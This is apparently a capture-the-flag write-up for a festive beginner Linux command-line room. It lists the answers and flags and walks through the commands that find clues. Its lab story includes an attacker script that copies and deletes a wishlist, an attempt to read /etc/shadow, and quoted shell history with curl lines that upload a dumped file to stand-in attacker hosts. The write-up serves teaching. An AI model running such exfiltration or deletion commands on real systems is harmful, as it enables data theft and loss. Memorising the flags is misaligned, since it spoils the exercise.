# Linux CLI - Shells Bells:
> Explore the Linux command-line interface and use it to unveil Christmas mysteries.

## Task 1 -> Introduction:
> The unthinkable has happened - McSkidy has been kidnapped. Without her, Wareville’s defenses are faltering, and Christmas itself hangs by a thread. But panic won’t save the season. A long road lies ahead to uncover what truly happened. The TBFC (The Best Festival Company) team already brainstorms what to do next, and their first lead points to the tbfc-web01, a Linux server processing Christmas wishlists. Somewhere within its data may lie the truth: traces of McSkidy’s final actions, or perhaps the clues to King Malhare’s twisted vision for EASTMAS.

- ``` I have successfully started my virtual machine! ```  marks the completion of ```Task 1```.

## Task 2 -> Linux CLI:
> Working With the Linux CLI
> - But, there is no graphical interface (GUI) on the server! How will we look for clues?
> - Who needs a GUI when we have a Linux command-line terminal? It’s even better!

> Linux has a powerful command-line interface, allowing you to use and manage the system simply by typing commands on your keyboard. It’s not as hard as it sounds - once you get > used to it, maybe you’ll like the CLI more than the graphical interface. Not only that, but most experienced IT and cyber security experts work with the CLI every day, so let's > start learning!

## Answers and Flags:
- ``` ls ```
- ``` THM{learning-linux-cli} ```
- ``` grep ```
- ``` THM{sir-carrotbane-attacks} ```
- ``` sudo su ```
- ``` THM{until-we-meet-again} ```

# Solution:
## Working With the Linux CLI
- RUN ``` echo "Hello World!" ``` and do ls.
- RUN ``` cat README.txt ```.
  > For all TBFC members,
  > Yesterday I spotted yet another Eggsploit on our servers.
  > Not sure what it means yet, but Wareville is in danger.
  > To be prepared, I'll write the security guide by tomorrow.
  > As a precaution, I'll also hide the guide from plain view.
  > ~ McSkidy
- RUN ``` cd Guides ``` and do ls -la.
  > ls -la shows any hidden files available in the directory.
- RUN ``` cat .guide.txt ```
  > I think King Malhare from HopSec Island is preparing for an attack.
  > Not sure what his goal is, but Eggsploits on our servers are not good.
  > Be ready to protect Christmas by following this Linux guide:

  > Check /var/log/ and grep inside, let the logs become your guide.
  > Look for eggs that want to hide, check their shells for what's inside!
- RUN ``` cd /var/log ```.
- RUN ``` grep "Failed password" auth.log ```.
  > Failed password for socmas from eggbox-196.hopsec.thm
- RUN ``` find /home/socmas -name *egg* ```.
  > /home/socmas/2025/eggstrike.sh
- RUN ``` cd /home/socmas/2025 ```
- RUN ``` cat eggstrike.sh ```
  > Eggstrike v0.3
  > © 2025, Sir Carrotbane, HopSec
  > cat wishlist.txt | sort | uniq > /tmp/dump.txt
  > rm wishlist.txt && echo "Chistmas is fading..."
  > mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"

## Sir Carrotbane Attacks:
 > Now it is clear that the server has been breached, and the Christmas wishlist has been replaced with an EASTMAS one. Although you found no clue of what happened to McSkidy,
 > at least you know the attackers were there. You can see how Sir Carrotbane replaced the wishlist by visiting http://MACHINE_IP:8080 from the VM's web browser. You can open
 > it by clicking the Firefox icon on the Desktop.
- RUN ``` cat /etc/shadow ```
  > cat: /etc/shadow: Permission denied
- RUN ``` cd /root ```
- RUN ``` cat .bash_history ```
  > curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
  > curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report.


## Concepts Learned:
- Revised command-line. 


 
